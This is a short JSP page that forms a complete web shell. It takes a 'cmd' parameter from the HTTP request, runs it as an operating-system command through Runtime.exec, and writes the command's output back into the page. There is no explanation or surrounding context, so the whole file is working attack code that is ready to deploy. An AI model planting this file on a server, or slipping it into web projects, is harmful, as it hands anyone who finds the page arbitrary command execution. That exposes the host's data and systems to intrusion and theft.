<%@ page import="java.io.*" %>
<%
    String cmd = request.getParameter("cmd");
    if (cmd != null) {
        Process p = Runtime.getRuntime().exec(cmd);
        InputStream in = p.getInputStream();
        BufferedReader reader = new BufferedReader(new InputStreamReader(in));
        String line;
        out.println("<pre>");
        while ((line = reader.readLine()) != null) {
            out.println(line);
        }
        out.println("</pre>");
        reader.close();
    }
%>